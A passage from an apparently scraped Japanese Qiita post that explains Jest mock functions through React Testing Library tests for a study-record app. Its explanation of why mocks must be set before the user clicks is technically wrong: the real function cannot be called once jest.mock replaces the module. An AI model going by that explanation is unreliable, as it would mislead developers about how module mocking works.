data-sourcepos=\"263:1-266:30\">ここでは、登録ボタンを押下する前に、<br>\n<strong>DBに登録するデータを設定し、登録したことにする</strong><br>\n<strong>DBから値を取得(登録データを返す)</strong><br>\nを設定をしています。</p>\n<p data-sourcepos=\"268:1-268:70\"><strong>なぜ、先に設定しないといけないのでしょうか？</strong></p>\n<p data-sourcepos=\"270:1-270:155\">本来の処理は、<code>「登録ボタン押下 → addStudyRecordでデータ登録 → GetAllStudyRecordsでデータ取得」</code>の流れで進みます。</p>\n<p data-sourcepos=\"272:1-273:120\">テスト内で登録ボタン押下後、GetAllStudyRecordsのモックを設定した場合、<strong>実際のGetAllStudyRecordsが呼び出され、モックを設定した関数は実行されない</strong>という状態が発生します。<br>\n→モックの設定が間に合わず、実際のGetAllStudyRecords関数（本物）が呼ばれてしまいます。</p>\n<p data-sourcepos=\"275:1-275:177\">登録ボタン押下の操作の前にモックを設定しておくことで、操作後に実行される関数はモック化された関数を呼ぶことができます。</p>\n<p data-sourcepos=\"277:1-277:112\">そのため、<strong>ユーザー操作を行う前にモックの戻り値を設定する</strong>ことが重要です。</p>\n<h3 data-sourcepos=\"282:1-282:81\">\n<span id=\"モックしたdb削除処理を使い削除されることを確認する\" class=\"fragment\"></span><a href=\"#%E3%83%A2%E3%83%83%E3%82%AF%E3%81%97%E3%81%9Fdb%E5%89%8A%E9%99%A4%E5%87%A6%E7%90%86%E3%82%92%E4%BD%BF%E3%81%84%E5%89%8A%E9%99%A4%E3%81%95%E3%82%8C%E3%82%8B%E3%81%93%E3%81%A8%E3%82%92%E7%A2%BA%E8%AA%8D%E3%81%99%E3%82%8B\"><i class=\"fa fa-link\"></i></a>モックしたDB削除処理を使い、削除されることを確認する</h3>\n<p data-sourcepos=\"284:1-284:117\">モックしたdeleteStudyRecordByIdを使って削除処理を確認するテストコードを追加しました。</p>\n<div class=\"code-frame\" data-lang=\"tsx\" data-sourcepos=\"286:1-341:3\"><div class=\"highlight\"><pre><code><span class=\"k\">import</span> <span class=\"p\">{</span> <span class=\"nx\">render</span><span class=\"p\">,</span> <span class=\"nx\">screen</span><span class=\"p\">,</span> <span class=\"nx\">waitFor</span> <span class=\"p\">}</span> <span class=\"k\">from</span> <span class=\"dl\">\"</span><span class=\"s2\">@testing-library/react</span><span class=\"dl\">\"</span><span class=\"p\">;</span>\n<span class=\"k\">import</span> <span class=\"nx\">App</span> <span class=\"k\">from</span> <span class=\"dl\">\"</span><span class=\"s2\">../App</span><span class=\"dl\">\"</span><span class=\"p\">;</span>\n<span class=\"k\">import</span> <span class=\"p\">{</span>\n  <span class=\"nx\">addStudyRecord</span><span class=\"p\">,</span>\n  <span class=\"nx\">deleteStudyRecordById</span><span class=\"p\">,</span>\n  <span class=\"nx\">GetAllStudyRecords</span><span class=\"p\">,</span>\n<span class=\"p\">}</span> <span class=\"k\">from</span> <span class=\"dl\">\"</span><span class=\"s2\">../lib/study-record</span><span class=\"dl\">\"</span><span class=\"p\">;</span>\n<span class=\"k\">import</span> <span class=\"nx\">userEvent</span> <span class=\"k\">from</span> <span class=\"dl\">\"</span><span class=\"s2\">@testing-library/user-event</span><span class=\"dl\">\"</span><span class=\"p\">;</span>\n\n<span class=\"nx\">jest</span><span class=\"p\">.</span><span class=\"nf\">mock</span><span class=\"p\">(</span><span class=\"dl\">\"</span><span class=\"s2\">../lib/study-record</span><span class=\"dl\">\"</span><span class=\"p\">,</span> <span class=\"p\">()</span> <span class=\"o\">=&gt;</span> <span class=\"p\">({</span>\n  <span class=\"na\">GetAllStudyRecords</span><span class=\"p\">:</span> <span class=\"nx\">jest</span><span class=\"p\">.</span><span class=\"nf\">fn</span><span class=\"p\">(),</span>\n  <span class=\"na\">addStudyRecord</span><span class=\"p\">:</span> <span class=\"nx\">jest</span><span class=\"p\">.</span><span class=\"nf\">fn</span><span class=\"p\">(),</span>\n  <span class=\"na\">deleteStudyRecordById</span><span class=\"p\">:</span> <span class=\"nx\">jest</span><span class=\"p\">.</span><span class=\"nf\">fn</span><span class=\"p\">(),</span>\n<span class=\"p\">}));</span>\n\n<span class=\"nf\">describe</span><span class=\"p\">(</span><span class=\"dl\">\"</span><span class=\"s2\">App</span><span class=\"dl\">\"</span><span class=\"p\">,</span> <span class=\"p\">()</span> <span class=\"o\">=&gt;</span> <span class=\"p\">{</span>\n  <span class=\"nf\">it</span><span class=\"p\">(</span><span class=\"dl\">\"</span><span class=\"s2\">削除ができること</span><span class=\"dl\">\"</span><span class=\"p\">,</span> <span class=\"k\">async </span><span class=\"p\">()</span> <span class=\"o\">=&gt;</span> <span class=\"p\">{</span>\n    <span class=\"kd\">const</span> <span class=\"nx\">user</span> <span class=\"o\">=</span> <span class=\"nx\">userEvent</span><span class=\"p\">.</span><span class=\"nf\">setup</span><span class=\"p\">();</span>\n    <span class=\"c1\">// DBから削除前の値を取得</span>\n    <span class=\"p\">(</span><span class=\"nx\">GetAllStudyRecords</span> <span class=\"kd\">as </span><span class=\"nx\">jest</span><span class=\"p\">.</span><span class=\"nx\">Mock</span><span class=\"p\">).</span><span class=\"nf\">mockResolvedValue</span><span class=\"p\">([</span>\n      <span class=\"p\">{</span> <span class=\"na\">id</span><span class=\"p\">:</span> <span class=\"dl\">\"</span><span class=\"s2\">2</span><span class=\"dl\">\"</span><span class=\"p\">,</span> <span class=\"na\">title</span><span class=\"p\">:</span> <span class=\"dl\">\"</span><span class=\"s2\">覚えてないよ</span><span class=\"dl\">\"</span><span class=\"p\">,</span> <span class=\"na\">time</span><span class=\"p\">:</span> <span class=\"mi\">300</span> <span class=\"p\">},</span>\n      <span class=\"p\">{</span> <span class=\"na\">id</span><span class=\"p\">:</span> <span class=\"dl\">\"</span><span class=\"s2\">3</span><span class=\"dl\">\"</span><span class=\"p\">,</span> <span class=\"na\">title</span><span class=\"p\">:</span> <span class=\"dl\">\"</span><span class=\"s2\">覚えたよ</span><span class=\"dl\">\"</span><span class=\"p\">,</span> <span class=\"na\">time</span><span class=\"p\">:</span> <span class=\"mi\">100</span> <span class=\"p\">},</span>\n    <span class=\"p\">]);</span>\n\n    <span class=\"nf\">render</span><span class=\"p\">(&lt;</span><span class=\"nc\">App</span> <span class=\"p\">/&gt;);</span>\n\n    <span class=\"c1\">// 削除前のデータが表示されること</span>\n    <span class=\"nf\">expect</span><span class=\"p\">(</span><span class=\"k\">await</span> <span class=\"nx\">screen</span><span class=\"p\">.</span><span class=\"nf\">findByText</span><span class=\"p\">(</span><span class=\"dl\">\"</span><span class=\"s2\">覚えたよ</span><span class=\"dl\">\"</span><span class=\"p\">)).</span><span class=\"nf\">toBeInTheDocument</span><span class=\"p\">();</span>\n    <span class=\"nf\">expect</span><span class=\"p\">(</span><span class=\"k\">await</span> <span class=\"nx\">screen</span><span class=\"p\">.</span><span class=\"nf\">findByText</span><span class=\"p\">(</span><span class=\"dl\">\"</span><span class=\"s2\">100</span><span class=\"dl\">\"</span><span class=\"p\">)).</span><span class=\"nf\">toBeInTheDocument</span><span class=\"p\">();</span>\n\n    <span class=\"c1\">// 前もってDB削除したことにする</span>\n    <span class=\"p\">(</span><span class=\"nx\">deleteStudyRecordById</span> <span class=\"kd\">as </span><span class=\"nx\">jest</span><span class=\"p\">.</span><span class=\"nx\">Mock</span><span class=\"p\">).</span><span class=\"nf\">mockResolvedValue</span><span class=\"p\">([</span>\n      <span class=\"p\">{</span> <span class=\"na\">id</span><span class=\"p\">:</span> <span class=\"dl\">\"</span><span class=\"s2\">2</span><span class=\"dl\">\"</span><span class=\"p\">,</span> <span class=\"na\">title</span><span class=\"p\">:</span> <span class=\"dl\">\"</span><span class=\"s2\">覚えてないよ</span><span class=\"dl\">\"</span><span class=\"p\">,</span> <span class=\"na\">time</span><span class=\"p\">:</span> <span class=\"mi\">300</span> <span class=\"p\">},</span>\n    <span class=\"p\">]);</span>\n\n    <span class=\"c1\">// 前もって削除後のDB取得をする</span>\n    <span class=\"p\">(</span><span class=\"nx\">GetAllStudyRecords</span> <span class=\"kd\">as </span><span class=\"nx\">jest</span><span class=\"p\">.</span><span class=\"nx\">Mock</span><span class=\"p\">).</span><span class=\"nf\">mockResolvedValue</span><span class=\"p\">([</span>\n      <span class=\"p\">{</span> <span class=\"na\">id</span><span class=\"p\">:</span> <span class=\"dl\">\"</span><span class=\"s2\">2</span><span class=\"dl\">\"</span><span class=\"p\">,</span> <span class=\"na\">title</span><span class=\"p\">:</span> <span class=\"dl\">\"</span><span class=\"s2\">覚えてないよ</span><span class=\"dl\">\"</span><span class=\"p\">,</span> <span class=\"na\">time</span><span class=\"p\">:</span> <span class=\"mi\">300</span> <span class=\"p\">},</span>\n    <span class=\"p\">]);</span>\n\n    <span class=\"c1\">// 削除ボタン押下</span>\n    <span class=\"kd\">const</span> <span class=\"nx\">deleteButtons</span> <span class=\"o\">=</span> <span class=\"k\">await</span> <span class=\"nx\">screen</span><span class=\"p\">.</span><span class=\"nf\">findAllByTestId</span><span class=\"p\">(</span><span class=\"dl\">\"</span><span class=\"s2\">delete-button</span><span class=\"dl\">\"</span><span class=\"p\">);</span>\n    <span class=\"k\">await</span> <span class=\"nx\">user</span><span class=\"p\">.</span><span class=\"nf\">click</span><span class=\"p\">(</span><span class=\"nx\">deleteButtons</span><span class=\"p\">[</span><span class=\"mi\">1</span><span class=\"p\">]);</span>\n\n    <span class=\"c1\">// 削除処理が呼び出されたことを確認</span>\n    <span class=\"k\">await</span> <span class=\"nf\">waitFor</span><span class=\"p\">(()</span> <span class=\"o\">=&gt;</span> <span class=\"p\">{</span>\n      <span class=\"nf\">expect</span><span class=\"p\">(</span><span class=\"nx\">deleteStudyRecordById</span><span class=\"p\">).</span><span class=\"nf\">toHaveBeenCalled</span><span class=\"p\">();</span>\n    <span class=\"p\">});</span>\n\n    <span class=\"c1\">// 削除したデータが表示されないこと</span>\n    <span class=\"nf\">expect</span><span class=\"p\">(</span><span class=\"nx\">screen</span><span class=\"p\">.</span><span class=\"nf\">queryByText</span><span class=\"p\">(</span><span class=\"dl\">\"</span><span class=\"s2\">覚えたよ</span><span class=\"dl\">\"</span><span class=\"p\">)).</span><span class=\"nx\">not</span><span class=\"p\">.</span><span class=\"nf\">toBeInTheDocument</span><span class=\"p\">();</span>\n    <span class=\"nf\">expect</span><span class=\"p\">(</span><span class=\"nx\">screen</span><span class=\"p\">.</span><span class=\"nf\">queryByText</span><span class=\"p\">(</span><span class=\"dl\">\"</span><span class=\"s2\">100</span><span class=\"dl\">\"</span><span class=\"p\">)).</span><span class=\"nx\">not</span><span class=\"p\">.</span><span class=\"nf\">toBeInTheDocument</span><span class=\"p\">();</span>\n  <span class=\"p\">});</span>\n<span class=\"p\">});</span>\n</code></pre></div></div>\n<details>\n<summary>参考：DB取得、登録、削除の実際の処理</summary>\n<div class=\"code-frame\" data-lang=\"ts\" data-sourcepos=\"347:1-386:3\">\n<div class=\"code-lang\"><span class=\"bold\">study-record.ts</span></div>\n<div class=\"highlight\"><pre><code><span class=\"k\">import</span> <span class=\"p\">{</span> <span class=\"nx\">supabase</span> <span class=\"p\">}</span> <span class=\"k\">from</span> <span class=\"dl\">\"</span><span class=\"s2\">../utils/supabase</span><span class=\"dl\">\"</span><span class=\"p\">;</span>\n<span class=\"k\">import</span> <span class=\"p\">{</span> <span class=\"nb\">Record</span> <span class=\"p\">}</span> <span class=\"k\">from</span> <span class=\"dl\">\"</span><span class=\"s2\">../domain/record</span><span class=\"dl\">\"</span><span class=\"p\">;</span>\n\n<span class=\"k\">export</span> <span class=\"kd\">const</span> <span class=\"nx\">GetAllStudyRecords</span><span class=\"p\">:</span> <span class=\"p\">()</span> <span class=\"o\">=&gt;</span> <span class=\"nb\">Promise</span><span class=\"o\">&lt;</span><span class=\"nb\">Record</span><span class=\"p\">[]</span><span class=\"o\">&gt;</span> <span class=\"o\">=</span> <span class=\"k\">async </span><span class=\"p\">()</span> <span class=\"o\">=&gt;</span> <span class=\"p\">{</span>\n  <span class=\"kd\">const</span> <span class=\"p\">{</span> <span class=\"nx\">data</span><span class=\"p\">,</span> <span class=\"nx\">error</span> <span class=\"p\">}</span> <span class=\"o\">=</span> <span class=\"k\">await</span> <span class=\"nx\">supabase</span><span class=\"p\">.</span><span class=\"k\">from</span><span class=\"p\">(</span><span class=\"dl\">\"</span><span class=\"s2\">study-record</span><span class=\"dl\">\"</span><span class=\"p\">).</span><span class=\"nf\">select</span><span class=\"p\">();</span>\n\n  <span class=\"k\">if </span><span class=\"p\">(</span><span class=\"nx\">error</span><span class=\"p\">)</span> <span class=\"p\">{</span>\n    <span class=\"k\">throw</span> <span class=\"k\">new</span> <span class=\"nc\">Error</span><span class=\"p\">(</span><span class=\"nx\">error</span><span class=\"p\">.</span><span class=\"nx\">message</span><span class=\"p\">);</span>\n  <span class=\"p\">}</span>\n\n  <span class=\"kd\">const</span> <span class=\"nx\">StudyRecords</span> <span class=\"o\">=</span> <span class=\"nx\">data</span><span class=\"p\">.</span><span class=\"nf\">map</span><span class=\"p\">(</span>\n    <span class=\"p\">(</span><span class=\"nx\">record</span><span class=\"p\">)</span> <span class=\"o\">=&gt;</span>\n      <span class=\"k\">new</span> <span class=\"nc\">Record</span><span class=\"p\">(</span><span class=\"nx\">record</span><span class=\"p\">.</span><span class=\"nx\">id</span><span class=\"p\">,</span> <span class=\"nx\">record</span><span class=\"p\">.</span><span class=\"nx\">title</span><span class=\"p\">,</span> <span class=\"nx\">record</span><span class=\"p\">.</span><span class=\"nx\">time</span><span class=\"p\">,</span> <span class=\"nx\">record</span><span class=\"p\">.</span><span class=\"nx\">created_at</span><span class=\"p\">)</span>\n  <span class=\"p\">);</span>\n  <span class=\"k\">return</span> <span class=\"nx\">StudyRecords</span><span class=\"p\">;</span>\n<span class=\"p\">};</span>\n\n<span class=\"k\">export</span> <span class=\"kd\">const</span> <span class=\"nx\">addStudyRecord</span> <span class=\"o\">=</span> <span class=\"k\">async </span><span class=\"p\">(</span><span class=\"nx\">data</span><span class=\"p\">:</span> <span class=\"nb\">Partial</span><span class=\"o\">&lt;</span><span class=\"nb\">Record</span><span class=\"o\">&gt;</span><span class=\"p\">)</span> <span class=\"o\">=&gt;</span> <span class=\"p\">{</span>\n  <span class=\"kd\">const</span> <span class=\"p\">{</span> <span class=\"nx\">error</span> <span class=\"p\">}</span> <span class=\"o\">=</span> <span class=\"k\">await</span> <span class=\"nx\">supabase</span>\n    <span class=\"p\">.</span><span class=\"k\">from</span><span class=\"p\">(</span><span class=\"dl\">\"</span><span class=\"s2\">study-record</span><span class=\"dl\">\"</span><span class=\"p\">)</span>\n    <span class=\"p\">.</span><span class=\"nf\">insert</span><span class=\"p\">({</span> <span class=\"na\">title</span><span class=\"p\">:</span> <span class=\"nx\">data</span><span class=\"p\">.</span><span class=\"nx\">title</span><span class=\"p\">,</span> <span class=\"na\">time</span><span class=\"p\">:</span> <span class=\"nx\">data</span><span class=\"p\">.</span><span class=\"nx\">time</span> <span class=\"p\">});</span>\n\n  <span class=\"k\">if </span><span class=\"p\">(</span><span class=\"nx\">error</span><span class=\"p\">)</span> <span class=\"p\">{</span>\n    <span class=\"k\">throw</span> <span class=\"k\">new</span> <span class=\"nc\">Error</span><span class=\"p\">(</span><span class=\"nx\">error</span><span class=\"p\">.</span><span class=\"nx\">message</span><span class=\"p\">);</span>\n  <span class=\"p\">}</span>\n<span class=\"p\">};</span>\n\n\n<span class=\"k\">export</span> <span class=\"kd\">const</span> <span class=\"nx\">deleteStudyRecordById</span> <span class=\"o\">=</span> <span class=\"k\">async </span><span class=\"p\">(</span><span class=\"nx\">id</span><span class=\"p\">:</span> <span class=\"kr\">string</span><span class=\"p\">)</span> <span class=\"o\">=&gt;</span> <span class=\"p\">{</span>\n  <span class=\"kd\">const</span> <span class=\"p\">{</span> <span class=\"nx\">error</span> <span class=\"p\">}</span> <span class=\"o\">=</span> <span class=\"k\">await</span> <span class=\"nx\">supabase</span>\n    <span class=\"p\">.</span><span class=\"k\">from</span><span class=\"p\">(</span><span class=\"dl\">\"</span><span class=\"s2\">study-record</span><span class=\"dl\">\"</span><span class=\"p\">)</span>\n    <span class=\"p\">.</span><span class=\"k\">delete</span><span class=\"p\">()</span>\n    <span class=\"p\">.</span><span class=\"nf\">eq</span><span class=\"p\">(</span><span class=\"dl\">\"</span><span class=\"s2\">id</span><span class=\"dl\">\"</span><span class=\"p\">,</span> <span class=\"nx\">id</span><span class=\"p\">)</span>\n    <span class=\"p\">.</span><span class=\"nf\">select</span><span class=\"p\">();</span>\n\n  <span class=\"k\">if </span><span class=\"p\">(</span><span class=\"nx\">error</span><span class=\"p\">)</span> <span class=\"p\">{</span>\n    <span class=\"k\">throw</span> <span class=\"k\">new</span> <span class=\"nc\">Error</span><span class=\"p\">(</span><span class=\"nx\">error</span><span class=\"p\">.</span><span class=\"nx\">message</span><span class=\"p\">);</span>\n  <span class=\"p\">}</span>\n</code></pre></div>\n</div>\n</details>\n<h1 data-sourcepos=\"392:1-392:14\">\n<span id=\"おわりに\" class=\"fragment\"></span><a href=\"#%E3%81%8A%E3%82%8F%E3%82%8A%E3%81%AB\"><i class=\"fa fa-link\"></i></a>おわりに</h1>\n<p data-sourcepos=\"393:1-393:144\">ユーザーの操作、実際に内部の処理を考慮しながらテストを書かなければいけないことを再認識しました。</p>\n<h1 data-sourcepos=\"395:1-395:8\">\n<span id=\"参考\" class=\"fragment\"></span><a href=\"#%E5%8F%82%E8%80%83\"><i class=\"fa fa-link\"></i></a>参考</h1>\n<p data-sourcepos=\"396:1-396:40\"><iframe id=\"qiita-embed-content__57d79d5de8bb97abfd65f5f23953ed8e\" src=\"https://qiita.com/embed-contents/link-card#qiita-embed-content__57d79d5de8bb97abfd65f5f23953ed8e\" data-content=\"https%3A%2F%2Fapidog.com%2Fjp%2Fblog%2Fwhat-is-mock%2F\" frameborder=\"0\" scrolling=\"no\" loading=\"lazy\" style=\"width:100%;\" height=\"29\">\n</iframe>\n</p>\n<p data-sourcepos=\"398:1-398:40\"><iframe id=\"qiita-embed-content__885372f0ac73413552148e9c17acbe26\" src=\"https://qiita.com/embed-contents/link-card#qiita-embed-content__885372f0ac73413552148e9c17acbe26\" data-content=\"https%3A%2F%2Fjestjs.io%2Fja%2Fdocs%2Fmock-functions\" frameborder=\"0\" scrolling=\"no\" loading=\"lazy\" style=\"width:100%;\" height=\"29\">\n</iframe>\n</p>\n","body":"# はじめに\nテストで欠かせないモックについて、`「そもそもモックとは何か」`、`「どのような仕組みか」`、`「いつどのような場合に使えばいいのか」`について、理解があやふやな状態でした。\n自分の理解、曖昧な状態を解消するために、学んだことをまとめてみました。\n\n# モックとは\n## モックの本来の（昔から使われていた）意味\n\nhttps://wa3.i-3-i.info/word19051.html\n\n**[こちら](https://wa3.i-3-i.info/word19051.html)の記事より引用**\n>モックとは\n「モックアップ」の省略表現。\n用語の中身としては\n「外見だけ、それっぽく出来ています。中身は作ってないから動いたりはしないよ。見た目とかのイメージを確認するためだけに使ってね」な試作品とか模型のこと\nです。\n>>システム開発の場合は、お客さまとの認識合わせのために作ります。\n実際に作る前、お客さまに「こんな物を作りますよ～、イメージと合っていますか～？」確認を取ることで涙目になる事態を回避する\n\n本来のモックの言葉の使い方は、`こんな見た目で、こんな感じに動きますよ～という超簡単なプロダクト`を指すことと理解しました。\n\n実務で、お客さまと認識合わせを行うため、画面やボタンを作り、このボタンを押して登録するとこの情報が画面表示されるなど、簡素化した画面と資料を作成したことを思い出しました。\n→これがモックだったのかと理解しました。\n\n`Jestのモックと少し意味合いが違う？`との疑問も発生しました。\n\n## テストとしてのモック\n**[こちら](https://wa3.i-3-i.info/word19051.html)の記事より引用**\n>最近では\n部品を呼び出すときにやり取りする内容（リクエストの内容とか）を確認するためのスタブ（テスト対象から呼び出される部品の代わり）\nを意図して「モック」という表現が使われることもあるみたいですね。\n\n### Jestでのモックの位置づけ\n\nJestのドキュメントにあるモック関数は上記の意味合いと理解しました。\n\nhttps://jestjs.io/ja/docs/mock-functions\n\n**ドキュメントより引用**\n>関数が持つ実際の実装を除去したり、関数の呼び出し（また、呼び出しに渡されたパラメータも含め）をキャプチャしたり、new によるコンストラクタ関数のインスタンス化をキャプチャできます。\nそうすることでテスト時のみの返り値の設定をすることが可能になります。\n\n\n## スタブとの違い\n上記と似た位置づけで、業務ではよく`スタブ`というワードで表現することがあります。\nこの場合、モック＝スタブなのか、モックとスタブに違いがあるのかよくわからなくなりました。\n\n### スタブとは\nhttps://wa3.i-3-i.info/word14933.html\n\n**[こちら](https://wa3.i-3-i.info/word14933.html)の記事より引用**\n\n>テスト対象から呼び出される、本来の部品の代わり（で呼び出される方のやつ）\n\n\n個人的には、`モックとスタブは同義`と捉えてもいいのではと判断しました。\n（みなさまの考えやご指摘がありましたらご教示いただけると嬉しいです。）\n\n\n\n# なぜモックを使うのか\n\n私は今、学習記録アプリを作成しています。\nここで新規登録モーダルを開き、フォームに項目を入力、登録ボタン押下後、データが登録されることを確認するテストをしたいと考えていました。\n\n**最初に考えたテストコード**\n```tsx\nimport { render, screen, waitFor } from \"@testing-library/react\";\nimport userEvent from \"@testing-library/user-event\";\nimport App from \"../App\";\n\ndescribe(\"App\", () => {\n  it(\"登録ができる\", async () => {\n    const user = userEvent.setup();\n    render(<App />);\n\n    // 新規登録ボタンをクリック\n    await user.click(await screen.findByTestId(\"new-record-button\"));\n    // タイトルを入力\n    await user.type(await screen.findByTestId(\"title-input\"), \"Test Title\");\n    // 時間を入力\n    const timeInput = await screen.findByTestId(\"time-input\");\n    const input = timeInput.querySelector('input[role=\"spinbutton\"]');\n    await user.clear(input!);\n    await user.type(input!, \"60\");\n\n    // 登録ボタンをクリック\n    await user.click(await screen.findByTestId(\"submit-button\"));\n\n    // モーダルが閉じるのを待つ\n    await waitFor(() => {\n      expect(screen.queryByText(\"Modal Title\")).not.toBeInTheDocument();\n    });\n\n    // 登録されたデータが表示されることを確認\n    expect(await screen.findByText(\"Test Title\")).toBeInTheDocument();\n    expect(await screen.findByText(\"60\")).toBeInTheDocument();\n  });\n});\n\n```\n\n上記のテストコードでも確認することができますが、**実際にDBに接続、データを登録、DBからデータを取得しないとテストコードとして成り立ちません。**\nテストを実行する度に、レコードが登録されてしまいます。\n\nDBのサーバーが止まっているときや、実際の開発でまだDB接続ができないという場合もあり得ます。\nその際は上記のテストコードは動かず、テストができないコードになります。\n\n→**外部システムに依存せずテストを行う、外部システムの代わりにモックを使う**とはこういうことかと理解できました。\n\n今回は、DBで理解しましたが、外部のAPIを利用するときなどでも使えると理解しました。\n→APIが開発中で、実際のAPIの利用不可な場合など\n\n# Jestでのmockの使い方\n\n## 1.jest.mock(...) 関数を使い、モック化を行う\n\n```diff_tsx\nimport { render, screen, waitFor } from \"@testing-library/react\";\nimport userEvent from \"@testing-library/user-event\";\nimport App from \"../App\";\n\n+jest.mock(\"../lib/study-record\", () => ({\n+  GetAllStudyRecords: jest.fn(),\n+  addStudyRecord: jest.fn(),\n+}));\n\ndescribe(\"App\", () => {\n  it(\"登録ができる\", async () => {\n    const user = userEvent.setup();\n    render(<App />);\n*** 以下略 ***\n```\n\n**jest.mock(`モックしたいモジュールが存在するパス`, `モックするモジュールを指定`)**\n* `GetAllStudyRecords: jest.fn()`\n→GetAllStudyRecordsを呼び出したときはモック（jest.fn()）を返す\n* `addStudyRecord: jest.fn()`\n→addStudyRecordを呼び出したときはモック（jest.fn()）を返す\n\nhttps://jestjs.io/ja/docs/mock-function-api#jestfnimplementation\n\n## 2.モックしたモジュールをテストコードで使用する\n\n### モックしたDBデータ取得処理を使い、初期表示確認を行う\nモックしたGetAllStudyRecordを使って初期表示確認をするテストコードを作成しました。\n\n```tsx\nimport { render, screen } from \"@testing-library/react\";\nimport App from \"../App\";\nimport { GetAllStudyRecords } from \"../lib/study-record\";\n\njest.mock(\"../lib/study-record\", () => ({\n  GetAllStudyRecords: jest.fn(),\n  addStudyRecord: jest.fn(),\n}));\n\ndescribe(\"App\", () => {\n  it(\"初期表示ができる\", async () => {\n    // モックデータを準備\n    const mockData = [{ id: 1, title: \"タイトル\", time: 3 }];\n\n    // DBから値を取得したことにする（モックデータを返す）\n    (GetAllStudyRecords as jest.Mock).mockResolvedValue(mockData);\n\n    // Appコンポーネントをレンダリング\n    render(<App />);\n\n    //　初期表示のタイトルが存在することを確認\n    expect(await screen.findByTestId(\"title\")).toBeInTheDocument();\n\n    screen.debug();\n  });\n});\n```\n\n**`(GetAllStudyRecords as jest.Mock).mockResolvedValue(mockData);`**\n* mockResolvedValueの引数に準備したデータを指定します\n* GetAllStudyRecordsを呼んだときにmockResolvedValueに指定したデータを返します\n\n\nhttps://jestjs.io/ja/docs/mock-function-api#mockfnmockresolvedvaluevalue\n\n`screen.debug();`でレンダリングされたDOMを確認するとモックデータが表示されることを確認できました。\n\n![image.png](https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/3993509/0e3a7f81-19e0-4284-87f3-d1ef49a1b06e.png)\n\n### モックしたDB登録処理を使い、データ登録確認を行う\n\nモックしたaddStudyRecordを使って登録処理を確認するテストコードを作成しました。\n\nここで学んだことは、**ユーザー操作の前に、モックの設定を行う必要がある**ということです。\n\n```tsx\nimport {\n  act,\n  queryByTestId,\n  render,\n  screen,\n  waitFor,\n} from \"@testing-library/react\";\nimport App from \"../App\";\nimport { addStudyRecord, GetAllStudyRecords } from \"../lib/study-record\";\nimport userEvent from \"@testing-library/user-event\";\n\njest.mock(\"../lib/study-record\", () => ({\n  GetAllStudyRecords: jest.fn(),\n  addStudyRecord: jest.fn(),\n  deleteStudyRecordById: jest.fn(),\n}));\n\ndescribe(\"App\", () => {\n  it(\"登録ができる\", async () => {\n    const user = userEvent.setup();\n    // DBから値を取得(空データを返す)\n    (GetAllStudyRecords as jest.Mock).mockResolvedValue([]);\n\n    render(<App />);\n\n    // 表示データ(tbodyの行)がないことを確認\n    expect(await screen.findByTestId(\"title\")).toBeInTheDocument();\n    expect(screen.queryByTestId(\"table-row\")).not.toBeInTheDocument();\n\n    // 登録ボタンを押下\n    await user.click(await screen.findByTestId(\"new-record-button\"));\n    // モーダルが表示されることを確認\n    expect(await screen.findByTestId(\"modal-title\")).toBeInTheDocument();\n\n    // フォームを入力\n    await user.type(await screen.findByTestId(\"title-input\"), \"タイトル\");\n    const timeInput = await screen.findByTestId(\"time-input\");\n    const input = timeInput.querySelector('input[role=\"spinbutton\"]');\n    await user.clear(input!);\n    await user.type(input!, \"60\");\n\n    // 先にDBに登録するデータを設定し、登録したことにする\n    (addStudyRecord as jest.Mock).mockResolvedValue([\n      { id: \"2\", title: \"タイトル\", time: 60 },\n    ]);\n\n    // 登録後にDBから再取得する可能性を考慮して、事前に設定\n    await waitFor(() => {\n      (GetAllStudyRecords as jest.Mock).mockResolvedValue([\n        { id: \"2\", title: \"タイトル\", time: 60 },\n      ]);\n    });\n\n    // 登録ボタン押下\n    await user.click(await screen.findByTestId(\"submit-button\"));\n\n    // addStudyRecordが呼び出されたことを確認\n    await waitFor(() => {\n      expect(addStudyRecord).toHaveBeenCalled();\n    });\n\n    // テーブルに登録データが表示されることを確認\n    expect(await screen.findByText(\"タイトル\")).toBeInTheDocument();\n    expect(await screen.findByText(\"60\")).toBeInTheDocument();\n    screen.debug();\n  });\n});\n```\n\nここでは、登録ボタンを押下する前に、\n**DBに登録するデータを設定し、登録したことにする**\n**DBから値を取得(登録データを返す)**\nを設定をしています。\n\n**なぜ、先に設定しないといけないのでしょうか？**\n\n本来の処理は、`「登録ボタン押下 → addStudyRecordでデータ登録 → GetAllStudyRecordsでデータ取得」`の流れで進みます。\n\nテスト内で登録ボタン押下後、GetAllStudyRecordsのモックを設定した場合、**実際のGetAllStudyRecordsが呼び出され、モックを設定した関数は実行されない**という状態が発生します。\n→モックの設定が間に合わず、実際のGetAllStudyRecords関数（本物）が呼ばれてしまいます。\n\n登録ボタン押下の操作の前にモックを設定しておくことで、操作後に実行される関数はモック化された関数を呼ぶことができます。\n\nそのため、**ユーザー操作を行う前にモックの戻り値を設定する**ことが重要です。\n\n\n\n\n### モックしたDB削除処理を使い、削除されることを確認する\n\nモックしたdeleteStudyRecordByIdを使って削除処理を確認するテストコードを追加しました。\n\n```tsx\nimport { render, screen, waitFor } from \"@testing-library/react\";\nimport App from \"../App\";\nimport {\n  addStudyRecord,\n  deleteStudyRecordById,\n  GetAllStudyRecords,\n} from \"../lib/study-record\";\nimport userEvent from \"@testing-library/user-event\";\n\njest.mock(\"../lib/study-record\", () => ({\n  GetAllStudyRecords: jest.fn(),\n  addStudyRecord: jest.fn(),\n  deleteStudyRecordById: jest.fn(),\n}));\n\ndescribe(\"App\", () => {\n  it(\"削除ができること\", async () => {\n    const user = userEvent.setup();\n    // DBから削除前の値を取得\n    (GetAllStudyRecords as jest.Mock).mockResolvedValue([\n      { id: \"2\", title: \"覚えてないよ\", time: 300 },\n      { id: \"3\", title: \"覚えたよ\", time: 100 },\n    ]);\n\n    render(<App />);\n\n    // 削除前のデータが表示されること\n    expect(await screen.findByText(\"覚えたよ\")).toBeInTheDocument();\n    expect(await screen.findByText(\"100\")).toBeInTheDocument();\n\n    // 前もってDB削除したことにする\n    (deleteStudyRecordById as jest.Mock).mockResolvedValue([\n      { id: \"2\", title: \"覚えてないよ\", time: 300 },\n    ]);\n\n    // 前もって削除後のDB取得をする\n    (GetAllStudyRecords as jest.Mock).mockResolvedValue([\n      { id: \"2\", title: \"覚えてないよ\", time: 300 },\n    ]);\n\n    // 削除ボタン押下\n    const deleteButtons = await screen.findAllByTestId(\"delete-button\");\n    await user.click(deleteButtons[1]);\n\n    // 削除処理が呼び出されたことを確認\n    await waitFor(() => {\n      expect(deleteStudyRecordById).toHaveBeenCalled();\n    });\n\n    // 